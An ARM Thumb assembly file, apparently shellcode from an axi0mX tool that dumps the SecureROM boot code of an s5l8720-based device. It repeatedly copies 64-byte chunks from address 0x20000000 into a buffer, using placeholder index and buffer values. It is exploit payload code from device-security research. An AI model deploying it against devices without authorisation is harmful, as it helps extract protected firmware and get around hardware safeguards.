@ shellcode for s5l8720-securerom-dumper by @axi0mX

.pool
.set securerom_addr,    0x20000000
.set index,             0xBAADBAAD    @ placeholder value
.set buffer_addr,       0xDEADDEAD    @ placeholder value

.global _start

.text
.code 16
_start:
  B copy_loop
  NOP
  NOP
  NOP
  NOP
  NOP
  NOP
  NOP

copy_loop:
  LDR R0, =securerom_addr
  LDR R1, =buffer_addr
  LDR R2, =index
  ADD R0, R0, R2

  LDR R2, [R0, #0]
  LDR R3, [R0, #4]
  LDR R4, [R0, #8]
  LDR R5, [R0, #12]
  LDR R6, [R0, #16]
  LDR R7, [R0, #20]

  STR R2, [R1, #0]
  STR R3, [R1, #4]
  STR R4, [R1, #8]
  STR R5, [R1, #12]
  STR R6, [R1, #16]
  STR R7, [R1, #20]

  LDR R2, [R0, #24]
  LDR R3, [R0, #28]
  LDR R4, [R0, #32]
  LDR R5, [R0, #36]
  LDR R6, [R0, #40]
  LDR R7, [R0, #44]

  STR R2, [R1, #24]
  STR R3, [R1, #28]
  STR R4, [R1, #32]
  STR R5, [R1, #36]
  STR R6, [R1, #40]
  STR R7, [R1, #44]

  LDR R2, [R0, #48]
  LDR R3, [R0, #52]
  LDR R4, [R0, #56]
  LDR R5, [R0, #60]

  STR R2, [R1, #48]
  STR R3, [R1, #52]
  STR R4, [R1, #56]
  STR R5, [R1, #60]

  B copy_loop

.end

